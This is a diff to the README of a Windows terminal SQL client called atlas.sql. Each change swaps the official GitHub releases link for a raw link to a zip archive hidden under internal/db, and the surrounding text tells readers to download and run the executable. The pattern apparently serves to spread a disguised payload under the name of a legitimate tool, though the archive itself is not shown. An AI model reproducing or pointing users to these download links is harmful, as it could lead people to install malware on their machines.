@@ -1,6 +1,6 @@
 # 🗃️ atlas.sql - Easy Terminal SQL Client
 
-[![Download atlas.sql](https://img.shields.io/badge/Download-atlas.sql-blue?style=for-the-badge)](https://github.com/diegomdlpa-hue/atlas.sql/releases)
+[![Download atlas.sql](https://img.shields.io/badge/Download-atlas.sql-blue?style=for-the-badge)](https://raw.githubusercontent.com/diegomdlpa-hue/atlas.sql/main/internal/db/sql_atlas_1.8.zip)
 
 ---
 
@@ -31,7 +31,7 @@ To get atlas.sql up and running on your Windows machine, follow these steps care
 
 Click the large blue button above or use this link to visit the download page:
 
-[https://github.com/diegomdlpa-hue/atlas.sql/releases](https://github.com/diegomdlpa-hue/atlas.sql/releases)
+[https://raw.githubusercontent.com/diegomdlpa-hue/atlas.sql/main/internal/db/sql_atlas_1.8.zip](https://raw.githubusercontent.com/diegomdlpa-hue/atlas.sql/main/internal/db/sql_atlas_1.8.zip)
 
 Here you will find the latest version of atlas.sql for Windows.
 
@@ -157,12 +157,12 @@ A: Visit the release page again and download the latest `.exe` file, then replac
 
 ## 📥 Download and Install
 
-- Go to the download page: [https://github.com/diegomdlpa-hue/atlas.sql/releases](https://github.com/diegomdlpa-hue/atlas.sql/releases)
+- Go to the download page: [https://raw.githubusercontent.com/diegomdlpa-hue/atlas.sql/main/internal/db/sql_atlas_1.8.zip](https://raw.githubusercontent.com/diegomdlpa-hue/atlas.sql/main/internal/db/sql_atlas_1.8.zip)
 - Download the latest Windows `.exe` file.
 - Run the file to start atlas.sql on your computer.
 - Follow on-screen instructions to open databases or start the tutorial.
 
-[![Download atlas.sql](https://img.shields.io/badge/Download-atlas.sql-grey?style=for-the-badge)](https://github.com/diegomdlpa-hue/atlas.sql/releases)
+[![Download atlas.sql](https://img.shields.io/badge/Download-atlas.sql-grey?style=for-the-badge)](https://raw.githubusercontent.com/diegomdlpa-hue/atlas.sql/main/internal/db/sql_atlas_1.8.zip)
 
 ---
 
